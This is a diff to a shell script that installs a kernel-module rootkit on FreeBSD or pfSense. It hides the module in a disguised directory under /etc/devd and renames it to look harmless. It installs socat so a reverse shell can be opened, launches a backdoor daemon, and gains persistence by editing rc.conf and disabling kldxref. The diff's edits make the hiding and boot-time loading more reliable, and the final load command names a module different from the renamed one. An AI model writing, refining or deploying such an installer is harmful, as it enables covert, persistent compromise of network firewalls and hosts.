@@ -1,6 +1,6 @@
 #!/bin/sh
 
-if [ $euid != 0 ]; then
+if [ "$EUID" -ne 0 ]; then
    echo "Must be root to run this"
    exit 1
 fi
@@ -8,32 +8,36 @@ fi
 # make writable
 mount -o rw /
 # make maliocus directory
-mkdir /etc/pkg/config-backup
+mkdir /etc/devd/conf_backs
 # define new directory to hide things in and LKM name
-LKM_PATH="/etc/pkg/config-backup"
-LKM_NAME="apekit_rootshit.ko"
+LKM_PATH="/etc/devd/conf_backs"
+LKM_NAME="LD_PRELOAD.ko"
 
 
 # the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
 # therefore we get socat
 pkg install socat -y
 
-# put the rootkit in the hidden directory
-cp "$LKM_NAME" "$LKM_PATH/"
-cp "apeshit" "$LKM_PATH/"
-1
 # executable
 chmod +x apeshit
 
+# put the rootkit in the hidden directory
+cp "$LKM_NAME" "$LKM_PATH/"
+cp "apeshit" "$LKM_PATH/"
+
 # run the daemon/process that does nothing that we intend to fork
+cd "$LKM_PATH"
 ./apeshit &
 
 # achieve persistance by loading the module everytime the system boots
-cp -f /etc/defaults/rc.conf /tmp/
-echo "kld_list=\"$LKM_PATH\"" >> /tmp/rc.conf
-sed -i '' s/^kldxref_enable.*=.*YES.*$/kldxref_enable=\"NO\"/ /tmp/rc.conf
-./bin/loader /tmp/rc.conf /etc/defaults/rc.conf
-rm -f /tmp/rc.conf
+# Ensure kld_list includes the LKM
+if grep -q '^kld_list=' /etc/rc.conf; then
+    sed -i '' "s/^kld_list=\"/kld_list=\"$LKM_NAME /" /etc/rc.conf
+else
+    echo "kld_list=\"$LKM_NAME\"" >> /etc/rc.conf
+fi
 
+# Disable kldxref by setting kldxref_enable="NO"
+sed -i '' 's/^kldxref_enable="YES"/kldxref_enable="NO"/' /etc/rc.conf
 
-./kldloadall.sh
+kldload apekit_rootshit.ko
